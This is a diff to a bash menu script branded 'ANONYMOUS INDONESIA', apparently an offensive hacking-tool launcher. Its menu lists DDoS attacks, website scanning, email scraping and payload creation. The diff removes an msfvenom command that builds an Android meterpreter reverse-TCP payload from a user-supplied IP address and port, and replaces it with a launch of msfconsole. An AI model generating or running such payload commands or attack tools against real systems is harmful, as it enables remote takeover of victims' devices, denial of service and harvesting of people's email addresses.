@@ -29,7 +29,7 @@ echo "$f[f]─>>DDOS ATTACK WEBSITE" | lolcat
 echo "$g[g]─>>SCANNING WEBSITE ADDRESS" | lolcat
 echo "$h[h]─>>EMAIL SCRAPER WEBSITE" | lolcat
 echo "$i[i]─>>CREATE PAYLOAD FOR WINDOWS x64" | lolcat
-echo "$j[j]─>>CREATE PAYLOAD FOR ANDROID" | lolcat
+echo "$j[j]─>>METASPLOIT" | lolcat
 echo "$k[k]─>>" | lolcat
 echo "$l[l]─>>" | lolcat
 echo "$m[m]─>>" | lolcat
@@ -273,25 +273,10 @@ sleep 2
 echo "##################################################################################"
 toilet -f future "ANONYMOUS INDONESIA @MrXonee" | lolcat
 echo "**********************************************************************************"
-echo "[!]RUNNING TOOLS CREATE PAYLOAD FOR ANDROID" | lolcat
+echo "[!]RUNNING TOOLS METASPLOIT" | lolcat
 echo "##################################################################################"
 sleep 5
-ifconfig
-echo "╭─[Masukan IP Address Komputer/Laptop]" | lolcat
-read -p"╰─>> " lhost
-echo "╭─[Masukan PORT]" | lolcat
-read -p"╰─>> " lport
-echo "##################################################################################" | lolcat
-echo "[!]MOHON TUNGGU SAMPAI SELESAI" | lolcat
-echo "##################################################################################" | lolcat
-msfvenom -p android/meterpreter/reverse_tcp --platform android -a dalvik LHOST=$lhost LPORT=$lport -f exe -o android.exe
-echo "##################################################################################" | lolcat
-echo "[!]SUCCESS CREATE PAYLOAD..." | lolcat
-echo "[!]CHECK PAYLOAD AT FOLDER Tools" | lolcat
-echo "##################################################################################" | lolcat
-echo "╭─[Ketik bash it.sh Jika Ingin Kembali]" | lolcat
-read -p"╰─>> " back
-$back
+msfconsole
 fi
 
 if [ $pil = k ]
